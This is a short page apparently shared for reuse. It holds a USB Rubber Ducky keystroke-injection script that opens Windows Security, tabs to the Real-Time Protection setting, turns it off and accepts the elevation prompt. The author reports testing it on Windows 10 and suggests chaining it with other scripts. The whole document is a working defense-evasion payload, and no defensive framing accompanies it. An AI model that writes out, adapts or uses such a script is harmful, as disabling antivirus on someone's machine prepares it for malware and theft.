# A ducky script that disables Windows Defender Real Time Protection
## Date : 04-10-2021

NOTE: This Code is Tested on Windows 10, 19043.1288 OS Build

Most older machines will probably need more delay

This can be combined with other scripts. 

```
REM Author : @krishnachaittanyah
REM This Script Will Disable Real Time Protection
REM *********************
REM We're going to disable Real Time Protection
REM *********************
DELAY 1000
GUI 
DELAY 500
STRING virus & threat protection
ENTER
DELAY 3000
TAB 
TAB
TAB
TAB
DELAY 200
ENTER
DELAY 200
SPACE 
DELAY 3000
ALT y
```